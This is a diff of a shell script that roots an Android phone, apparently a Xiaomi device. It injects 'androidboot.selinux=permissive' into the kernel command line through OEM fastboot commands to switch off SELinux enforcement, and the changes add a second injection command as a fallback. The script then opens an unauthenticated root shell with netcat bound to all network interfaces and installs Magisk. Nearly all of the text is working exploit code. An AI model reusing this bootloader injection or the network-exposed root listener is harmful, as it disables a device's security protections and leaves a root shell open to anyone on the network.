@@ -9,10 +9,6 @@ MAGISK_URL="https://github.com/topjohnwu/Magisk/releases/download/v${MAGISK_VER}
 TMP_DIR="/tmp"
 NC_PORT=1234
 
-safe_exit() {
-    (return 0 2>/dev/null) && return "$1" || exit "$1"
-}
-
 log() { echo "[*] $1"; }
 err() { echo "[!] $1"; }
 
@@ -66,26 +62,55 @@ miuiupdateuni
 fi
 
 # ── 3. fastboot step if selinux is enforcing ──────────────────────────────────
-selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
-if [ "$selinux" != "permissive" ]; then
-    log "selinux is enforcing, doing cmdline injection..."
+selinuxcheckhwfence(){
+    selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
+    if [ "$selinux" = "permissive" ]; then
+    log "set selinux permissive success"
+    else
+        err "selinux still enforcing after both injections - device may be patched or OEM commands missing, exiting"
+    exit 1
+    fi
+}
+hwfencevalue(){
     adb reboot bootloader
     until fastboot devices | grep -q fastboot; do sleep 1; done
-    fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
+    fastboot oem set-hw-fence-value 0 androidboot.selinux=permissive
     fastboot continue
-
     log "waiting for adb..."
     adb wait-for-device
     log "waiting for android boot..."
     until adb shell getprop sys.boot_completed 2>/dev/null | grep -q 1; do sleep 1; done
     log "waiting for /data..."
     until adb shell '[ -d /data/data ]' 2>/dev/null; do sleep 1; done
-
+    selinuxcheckhwfence
+        }
+selinuxcheckpreemption(){
     selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
-    if [ "$selinux" != "permissive" ]; then
-        err "selinux still enforcing after cmdline injection - aborting"
-        safe_exit 1
+    if [ "$selinux" = "permissive" ]; then
+    log "set selinux permissive success"
+    else
+        err "selinux still enforcing after first injection - trying second injection command (set-hw-fence-value)..."
+    hwfencevalue
     fi
+}
+gpupreemption(){
+selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
+if [ "$selinux" != "permissive" ]; then
+    log "selinux is enforcing, trying first cmdline injection (set-gpu-preemption)..."
+    adb reboot bootloader
+    until fastboot devices | grep -q fastboot; do sleep 1; done
+    fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
+    fastboot continue
+    log "waiting for adb..."
+    adb wait-for-device
+    log "waiting for android boot..."
+    until adb shell getprop sys.boot_completed 2>/dev/null | grep -q 1; do sleep 1; done
+    log "waiting for /data..."
+    until adb shell '[ -d /data/data ]' 2>/dev/null; do sleep 1; done
+    selinuxcheckpreemption
+fi
+}
+gpupreemption
 
 # ── 4. check wifi and get device IP ──────────────────────────────────────────
     log "checking wifi..."
@@ -93,7 +118,7 @@ if [ "$selinux" != "permissive" ]; then
     IP=$(adb shell ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1 | tr -d '\r')
     if [ -z "$IP" ] || [ "$IP" = "127.0.0.1" ]; then
     err "device not connected to wifi - connect to a wifi network and retry"
-    safe_exit 1
+    exit 1
     fi
     log "device IP: $IP"
 
@@ -103,11 +128,8 @@ if [ "$selinux" != "permissive" ]; then
         s16 'nc -s 0.0.0.0 -p $NC_PORT -L sh -l' \
         s16 '$DEVICE_TMP/listener.log' i32 600" &
     sleep 3
-    rsh "id" | grep -q "uid=0" || { err "root listener failed after reboot"; safe_exit 1; }
+    rsh "id" | grep -q "uid=0" || { err "root listener failed after reboot"; exit 1; }
     log "root shell listener running"
-else
-    log "selinux is permissive, skipping cmdline step"
-fi
 
 # ── 5. extract and push binaries ──────────────────────────────────────────────
 log "pushing magisk binaries..."
@@ -124,7 +146,7 @@ unzip -o "$TMP_DIR/$MAGISK_APK" \
 
 if [ $? -ne 0 ]; then
     err "failed to extract binaries from apk"
-    safe_exit 1
+    exit 1
 fi
 
 cp "$TMPDIR/lib/arm64-v8a/libbusybox.so"      "$TMPDIR/busybox"
@@ -354,7 +376,7 @@ else
     adb shell cat "$DEVICE_TMP/magisk_setup.log"
     if ! adb shell cat "$DEVICE_TMP/magisk_setup.log" | grep -q "SETUP_DONE"; then
         err "setup failed"
-        safe_exit 1
+        exit 1
     fi
     log "setup ok"
 fi
